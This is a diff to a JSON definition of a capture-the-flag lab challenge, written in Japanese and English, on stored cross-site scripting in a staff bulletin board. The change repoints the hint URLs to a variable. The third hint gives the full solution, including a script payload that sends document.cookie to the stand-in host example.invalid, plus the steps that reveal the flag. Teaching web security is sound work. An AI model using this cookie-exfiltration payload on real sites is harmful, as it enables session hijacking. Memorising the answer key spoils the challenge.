@@ -8,9 +8,9 @@
   "difficulty": 2,
   "estimatedDuration": "30 分",
   "track": {
-    "id": "absolute-beginner-to-stackstack",
-    "order": 50,
-    "chapter": "3. Browser attacks / ブラウザの攻撃"
+    "id": "ipa-web-security",
+    "order": 1,
+    "chapter": "IPA §1.5 XSS"
   },
   "shortDescription": "スタッフ専用の社内掲示板。投稿を見たセキュリティ担当が持つ合言葉を、投稿の中身だけで奪い取れ。",
   "instructions": "掲示板に投稿すると、 後でセキュリティ担当がその投稿を確認しに来る。 担当が確認した瞬間に手に入る合言葉 (`TC{...}`) をこのポータルに提出せよ。\n\n投稿・巡回のリクエスト・監視ログの確認、 この 3 つの操作はどれも自分の手で行う必要がある (担当は自動では巡回しない)。\n\n手がかりが欲しくなったら、 下のヒントを開こう (ヒントにはスコアのペナルティが付く)。",
@@ -62,7 +62,7 @@
         },
         {
           "id": "hint-3",
-          "content": "Here is the full sequence. (1) `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` to post the malicious message. (2) `curl -s -X POST http://127.0.0.1:18080/admin/report` to fire the security reviewer's pass (nothing happens until you call this). (3) `curl -s http://127.0.0.1:18080/admin/captured` — the captured request's body contains `session=TC{xss_...}`; that `TC{...}` value is the flag."
+          "content": "Here is the full sequence. Set `BASE` to the access URL shown in the portal (`BASE=<access URL>`), then run: (1) `curl -s \"$BASE/post\" --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` to post the malicious message. (2) `curl -s -X POST \"$BASE/admin/report\"` to fire the security reviewer's pass (nothing happens until you call this). (3) `curl -s \"$BASE/admin/captured\"` — the captured request's body contains `session=TC{xss_...}`; that `TC{...}` value is the flag."
         }
       ]
     }
@@ -96,7 +96,7 @@
       },
       {
         "id": "hint-3",
-        "content": "手順をすべて示す。 (1) `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` で悪意ある投稿を送る。 (2) `curl -s -X POST http://127.0.0.1:18080/admin/report` でセキュリティ担当の巡回を発火させる (これを呼ばない限り担当は掲示板を見に来ない)。 (3) `curl -s http://127.0.0.1:18080/admin/captured` を確認すると、 捕捉されたリクエストの body に `session=TC{xss_...}` が含まれている ── その `TC{...}` の部分がフラグ。",
+        "content": "手順をすべて示す。 ポータルに表示されている **アクセス先 URL** を `BASE` に控えてから実行する (`BASE=<アクセス先 URL>`)。 (1) `curl -s \"$BASE/post\" --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` で悪意ある投稿を送る。 (2) `curl -s -X POST \"$BASE/admin/report\"` でセキュリティ担当の巡回を発火させる (これを呼ばない限り担当は掲示板を見に来ない)。 (3) `curl -s \"$BASE/admin/captured\"` を確認すると、 捕捉されたリクエストの body に `session=TC{xss_...}` が含まれている ── その `TC{...}` の部分がフラグ。",
         "penalty": 25
       }
     ]
